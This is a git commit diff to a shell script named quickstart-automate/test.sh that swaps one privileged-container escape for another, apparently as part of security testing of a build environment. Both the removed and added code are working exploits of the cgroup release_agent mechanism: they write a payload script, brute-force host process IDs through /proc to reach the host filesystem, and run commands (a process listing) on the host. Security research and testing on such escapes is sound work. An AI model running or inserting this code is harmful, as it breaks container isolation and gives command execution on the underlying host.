21350a078167f3ed4c900ef99f392169aee04eb5
Juan José López Jaimez <jjlopezjaimez@google.com>
2022-10-27 16:57:53 -0400

    aaa

--- quickstart-automate/test.sh
+++ quickstart-automate/test.sh
@@ -1,19 +1,57 @@
 #!/bin/sh
-echo Finds + enables a cgroup release_agent
-d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
-echo Enables notify_on_release in the cgroup
-mkdir -p $d/w; echo 1 > $d/w/notify_on_release
-echo Finds path of OverlayFS mount for container
-# Unless the configuration explicitly exposes the mount point of the host filesystem
-# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
-t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-echo Sets release_agent to /path/payload
-touch /o; echo $t/c > $d/release_agent
-echo Creates a payload
-echo "#!/bin/sh" > /c
-echo "ps > $t/o" >> /c
-chmod +x /c
-echo Triggers the cgroup via empty cgroup.procs
-sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
-echo Reads the output
-cat /o
+
+OUTPUT_DIR="/"
+MAX_PID=65535
+CGROUP_NAME="xyx"
+CGROUP_MOUNT="/tmp/cgrp"
+PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
+PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
+OUTPUT_NAME="${CGROUP_NAME}_payload.out"
+OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
+
+# Run a process for which we can search for (not needed in reality, but nice to have)
+sleep 10000 &
+
+# Prepare the payload script to execute on the host
+cat > ${PAYLOAD_PATH} << __EOF__
+#!/bin/sh
+
+OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
+
+# Commands to run on the host<
+ps -eaf > \${OUTPATH} 2>&1
+__EOF__
+
+# Make the payload script executable
+chmod a+x ${PAYLOAD_PATH}
+
+# Set up the cgroup mount using the memory resource cgroup controller
+mkdir ${CGROUP_MOUNT}
+mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
+mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
+echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
+
+# Brute force the host pid until the output path is created, or we run out of guesses
+TPID=1
+while [ ! -f ${OUTPUT_PATH} ]
+do
+  if [ $((${TPID} % 100)) -eq 0 ]
+  then
+    echo "Checking pid ${TPID}"
+    if [ ${TPID} -gt ${MAX_PID} ]
+    then
+      echo "Exiting at ${MAX_PID} :-("
+      exit 1
+    fi
+  fi
+  # Set the release_agent path to the guessed pid
+  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
+  # Trigger execution of the release_agent
+  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+  TPID=$((${TPID} + 1))
+done
+
+# Wait for and cat the output
+sleep 1
+echo "Done! Output:"
+cat ${OUTPUT_PATH}
